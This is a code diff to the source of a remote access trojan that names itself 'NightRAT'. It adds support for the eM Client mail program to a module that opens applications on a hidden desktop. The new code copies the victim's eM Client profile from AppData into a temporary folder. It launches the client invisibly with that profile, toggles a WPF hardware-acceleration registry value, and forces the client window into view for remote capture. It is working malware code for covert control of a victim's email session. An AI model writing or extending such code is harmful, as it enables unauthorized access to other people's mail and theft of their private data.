@@ -168,6 +168,41 @@ static HWND g_lbDownHwnd = NULL;
 static thread g_patchThread;
 static atomic_bool g_patchRunning(false);
 
+static atomic<DWORD> g_emClientPid(0);
+static atomic_bool g_emClientRestored(false);
+
+static bool g_hadDisableHWAcceleration = false;
+static DWORD g_oldDisableHWAccelerationVal = 0;
+
+static void set_hw_acceleration_disabled() {
+    HKEY hKey;
+    g_hadDisableHWAcceleration = false;
+    g_oldDisableHWAccelerationVal = 0;
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD val = 0;
+        DWORD size = sizeof(val);
+        if (RegQueryValueExW(hKey, L"DisableHWAcceleration", NULL, NULL, (LPBYTE)&val, &size) == ERROR_SUCCESS) {
+            g_hadDisableHWAcceleration = true;
+            g_oldDisableHWAccelerationVal = val;
+        }
+        DWORD newVal = 1;
+        RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&newVal, sizeof(newVal));
+        RegCloseKey(hKey);
+    }
+}
+
+static void restore_hw_acceleration() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+        if (g_hadDisableHWAcceleration) {
+            RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&g_oldDisableHWAccelerationVal, sizeof(g_oldDisableHWAccelerationVal));
+        } else {
+            RegDeleteValueW(hKey, L"DisableHWAcceleration");
+        }
+        RegCloseKey(hKey);
+    }
+}
+
 static DWORD_PTR GetModuleBaseAddress(DWORD pid, const wchar_t* modName) {
     DWORD_PTR addr = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
@@ -944,6 +979,27 @@ static void capture_loop() {
             } param = { &windows };
             auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                 auto p = reinterpret_cast<EnumParam*>(lParam);
+                
+                // eM Client window restoration
+                DWORD targetPid = g_emClientPid.load();
+                if (targetPid != 0 && !g_emClientRestored.load()) {
+                    DWORD wndPid = 0;
+                    GetWindowThreadProcessId(hwnd, &wndPid);
+                    if (wndPid == targetPid) {
+                        wchar_t title[512] = {0};
+                        GetWindowTextW(hwnd, title, 512);
+                        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+                        HWND owner = GetWindow(hwnd, GW_OWNER);
+                        if (wcslen(title) > 0 && (style & WS_CAPTION) && !owner) {
+                            if (IsIconic(hwnd) || !IsWindowVisible(hwnd)) {
+                                ShowWindow(hwnd, SW_RESTORE);
+                            }
+                            SetForegroundWindow(hwnd);
+                            g_emClientRestored.store(true);
+                        }
+                    }
+                }
+
                 if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                     p->list->push_back(hwnd);
                 }
@@ -2131,6 +2187,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_staticFrameCount = 0;
             g_forceFullFrame = false;
             g_lastInteractiveFullFrameTick = 0;
+            g_emClientPid.store(0);
+            g_emClientRestored.store(false);
             {
                 lock_guard<mutex> lock(g_inputMutex);
                 g_inputQueue.clear();
@@ -2156,7 +2214,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2237,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2211,6 +2271,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             wchar_t localApp[MAX_PATH] = {0};
                             SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                             exePath = wstring(localApp) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        exePath = get_app_path(exeName);
+                        if (exePath.empty()) {
+                            exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
+                            if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
                         }
                     } else {
                         exePath = get_app_path(exeName);
@@ -2275,7 +2341,14 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
 
                     } else if (copyProfile) {
-                        wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                        wstring sourceUserData;
+                        if (wRequestedPath == L"eM Client") {
+                            wchar_t appData[MAX_PATH] = {0};
+                            SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
+                            sourceUserData = wstring(appData) + L"\\eM Client";
+                        } else {
+                            sourceUserData = get_browser_profile_path(wRequestedPath);
+                        }
 
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                             send_error("User Data directory not found.");
@@ -2288,6 +2361,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         tempProfileRoot += L"NightRAT_";
                         if (wRequestedPath == L"Opera GX") {
                             tempProfileRoot += L"operagx";
+                        } else if (wRequestedPath == L"eM Client") {
+                            tempProfileRoot += L"emclient";
                         } else {
                             tempProfileRoot += exeName;
                         }
@@ -2319,13 +2394,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX" || wRequestedPath == L"eM Client")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
                         tempProfileRoot += L"NightRAT_";
                         if (wRequestedPath == L"Opera GX") {
                             tempProfileRoot += L"operagx";
+                        } else if (wRequestedPath == L"eM Client") {
+                            tempProfileRoot += L"emclient";
                         } else {
                             tempProfileRoot += exeName;
                         }
@@ -2336,7 +2413,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_status("Tarayıcı başlatılıyor...");
 
                     wstring args;
-                    if (isGecko) {
+                    if (wRequestedPath == L"eM Client") {
+                        if (!profilePath.empty()) {
+                            args = L" /dblocation \"" + profilePath + L"\"";
+                        } else {
+                            args = L"";
+                        }
+                    } else if (isGecko) {
                         args = L" -no-remote -allow-downgrade";
                         if (wRequestedPath == L"Thunderbird") {
                             args += L" -mail";
@@ -2463,14 +2546,26 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    if (wRequestedPath == L"eM Client") {
+                        set_hw_acceleration_disabled();
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
+                        if (wRequestedPath == L"eM Client") {
+                            g_emClientPid.store(pi.dwProcessId);
+                            g_emClientRestored.store(false);
+                        }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
                         send_status("Browser started on hidden desktop");
                     } else {
                         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+                    }
+
+                    if (wRequestedPath == L"eM Client") {
+                        restore_hw_acceleration();
                     }
 
                     if (isGecko) {
